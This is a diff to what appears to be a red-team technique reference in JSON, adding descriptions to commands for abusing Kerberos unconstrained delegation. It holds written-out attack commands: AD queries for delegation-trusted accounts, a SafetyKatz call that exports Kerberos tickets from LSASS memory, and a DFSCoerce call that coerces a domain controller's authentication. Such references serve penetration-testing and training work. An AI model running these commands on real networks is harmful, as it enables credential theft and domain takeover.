@@ -71,19 +71,23 @@
   "variations": [
     {
       "label": "AD Module: find computers with unconstrained delegation",
-      "command": "Get-ADComputer -Filter {TrustedForDelegation -eq $True} | select Name,DNSHostName"
+      "command": "Get-ADComputer -Filter {TrustedForDelegation -eq $True} | select Name,DNSHostName",
+      "description": "Finds computer accounts trusted for unconstrained Kerberos delegation. These machines cache TGTs of any user who authenticates to them - compromising one lets you steal domain admin tickets."
     },
     {
       "label": "AD Module: find users with unconstrained delegation",
-      "command": "Get-ADUser -Filter {TrustedForDelegation -eq $True} | select Name"
+      "command": "Get-ADUser -Filter {TrustedForDelegation -eq $True} | select Name",
+      "description": "Queries Active Directory user objects with specific filters to identify accounts of interest for further enumeration or attack."
     },
     {
       "label": "Passive ticket extraction from LSASS",
-      "command": "SafetyKatz.exe \"evasive-sekurlsa::tickets /export\""
+      "command": "SafetyKatz.exe \"evasive-sekurlsa::tickets /export\"",
+      "description": "Exports all Kerberos tickets from LSASS memory. Captures TGTs and service tickets for pass-the-ticket attacks or offline analysis."
     },
     {
       "label": "DFSCoerce (alternative to Printer Bug)",
-      "command": "C:\\AD\\Tools\\DFSCoerce-andrea.exe -t <dc_host> -l <unconstrained_host>"
+      "command": "C:\\AD\\Tools\\DFSCoerce-andrea.exe -t <dc_host> -l <unconstrained_host>",
+      "description": "DFSCoerce (alternative to Printer Bug). See the command syntax for exact parameters and flags."
     }
   ],
   "recommended": [
